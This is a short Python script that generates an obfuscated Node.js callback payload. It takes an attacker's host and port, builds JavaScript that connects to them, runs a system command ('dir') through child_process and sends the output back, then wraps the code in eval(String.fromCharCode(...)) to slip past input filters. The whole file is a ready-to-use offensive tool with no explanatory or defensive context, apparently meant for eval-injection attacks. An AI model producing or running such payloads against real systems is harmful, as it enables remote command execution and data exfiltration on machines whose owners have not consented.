import sys

if len(sys.argv) != 3:
    print ("Usage: %s <LHOST> <LPORT>" % (sys.argv[0]))
    sys.exit(0)

IP_ADDR = sys.argv[1]
PORT = sys.argv[2]

def charencode(string):
    encoded = ''
    for char in string:
        encoded = encoded + "," + str(ord(char))
    return encoded[1:]

print ("[+] LHOST = %s" % (IP_ADDR))
print ("[+] LPORT = %s" % (PORT))
NODEJS_REV_SHELL = '''var net = require('net');var { exec } = require('child_process');HOST="%s";PORT="%s";function c(HOST,PORT) {var client = new net.Socket();client.connect(PORT, HOST, function() {exec("dir", (error, stdout, stderr) => {if (error) {client.write(error);return;}client.write(stdout);});});}c(HOST,PORT);''' % (IP_ADDR, PORT)
print ("[+] Encoding")
PAYLOAD = charencode(NODEJS_REV_SHELL)
print ("eval(String.fromCharCode(%s))" % (PAYLOAD))